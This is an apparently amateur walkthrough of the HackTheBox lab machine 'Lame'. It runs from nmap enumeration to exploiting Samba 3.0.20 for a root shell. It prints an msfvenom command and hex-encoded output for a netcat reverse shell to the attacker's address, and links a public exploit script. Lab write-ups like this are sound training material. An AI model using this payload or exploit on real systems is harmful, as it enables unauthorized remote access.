@@ -1,0 +1,180 @@
+Introduction
+Hello Everyone!! This is first ever right writeup and today we are going to solve a box named as “Lame” which is a lab presented by HackTheBox.
+
+Level: Beginners
+
+Let’s begin the Game!!
+
+Since these labs are online available therefore they have static IP and IP of Lame is 10.10.10.3 so let’s begin with nmap port enumeration.
+
+TL;DR ---- This is a Linux machine running Samba 3.0.20, which is vulnerable and exploit can be found on expliotdb to get the foothold/user access of the machine.
+
+Target Machine Information:
+Hostname : LAME
+IP Address : 10.10.10.3
+OS : Linux
+Overview:
+In this walkthough, I will be showing how to root the machine without using the metasploit method as most of the walkthrough used the automated way.
+
+# Reconnaissance
+## Nmap
+
+nmap -T4 -A -p- 10.10.10.3
+```bash
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-23 04:00 EDT
+Nmap scan report for lame.htb (10.10.10.3)
+Host is up (0.19s latency).
+Not shown: 65530 filtered ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.2
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Arris TG862G/CT cable modem (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.22 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 2h02m36s, deviation: 2h49m43s, median: 2m35s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2021-06-23T04:06:00-04:00
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+TRACEROUTE (using port 22/tcp)
+HOP RTT       ADDRESS
+1   190.52 ms 10.10.14.1
+2   190.85 ms lame.htb (10.10.10.3)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 215.88 seconds
+```
+
+## Open ports
+* FTP (TCP-21)
+* SSH (TCP-22)
+* Smb (TCP-139)
+* Samba (TCP-443)
+* distccd (TCP-3632)
+* Host: Samba 3.0.20-Debian
+
+## Enumaration
+
+We know from the nmap output that FTP allows anonymous login. This means that we are able to connect to FTP using the username "anonymous" and no password.
+![[Pasted image 20210623140140.png]]
+
+We successfully login to FTP but seems nothing inside. So we move on to SAMBA and see what we can do.
+
+We searched 'samba 3.0.20 exploit' and we found 3 interesting exploits.
+![[Pasted image 20210629125726.png]]
+
+We will use searchsploit to see if there's any exploit availble samba 3.0.20
+
+searchsploit samba 3.0.20
+![[Pasted image 20210623152435.png]]
+
+There is one Metasploit module, so we will use it.
+
+# Exploitation
+Start Metasploit using msfconsole
+
+Now again search for "samba 3.0.20" and select the exploit
+![[Pasted image 20210623153003.png]]
+
+Now, view the options using "show options"
+and after that set the LHOST, RHOST and expliot
+![[Pasted image 20210623153257.png]]
+
+Start Metasploit using msfconsole
+
+Now again search for "samba 3.0.20" and select the exploit
+![[Pasted image 20210623153003.png]]
+
+Now, view the options using "show options"
+and after that set the LHOST, RHOST and expliot
+![[Pasted image 20210623153257.png]]
+
+We will use `exploit-smb-3.0.20.py` script to exploit
+
+https://github.com/macha97/exploit-smb-3.0.20/blob/master/exploit-smb-3.0.20.py
+
+![[Pasted image 20210629130140.png]]
+
+We have to use msfvenom to creat our reverse shell payload and replace it in  the script.
+
+msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.2 LPORT=1337 -f python
+```bash
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 96 bytes
+Final size of python file: 483 bytes
+buf =  b""
+buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x66"
+buf += b"\x71\x6f\x73\x76\x66\x3b\x20\x6e\x63\x20\x31\x30\x2e"
+buf += b"\x31\x30\x2e\x31\x34\x2e\x32\x20\x31\x33\x33\x37\x20"
+buf += b"\x30\x3c\x2f\x74\x6d\x70\x2f\x66\x71\x6f\x73\x76\x66"
+buf += b"\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f"
+buf += b"\x74\x6d\x70\x2f\x66\x71\x6f\x73\x76\x66\x20\x32\x3e"
+buf += b"\x26\x31\x3b\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x66"
+buf += b"\x71\x6f\x73\x76\x66"
+```
+
+
+Faced problems
+![[Pasted image 20210629131800.png]]
+![[Pasted image 20210629135151.png]]
+
+So, I googled about them and found solutions to those If you face the same error you can refer to the links mentioned below:
+I used this resources
+https://pypi.org/project/smbprotocol/
+https://stackoverflow.com/questions/606191/convert-bytes-to-a-string
+
+After changes script looks like this
+![[Pasted image 20210629135033.png]]
+
+Fire the exploit and this time You will get a reverse Shell In the Netcat listener you started in the another tab.
+
+We get the Reverse Shell as “Root”.
+
+![[Pasted image 20210629135508.png]]
+
+And the machine is pwned.
+
+Things I learned from this Box :
+
+→ Having some knowledge of python is a must in order to understand and make the exploit work.
+
+So this was my first of the many more upcoming writeup’s from the list. So, Keep in tune and Thanks for reading the Writeup. I hope you liked it.
+
+Any type of feedback or suggestions are appreciated.
+
+You can reach out to me on : ---
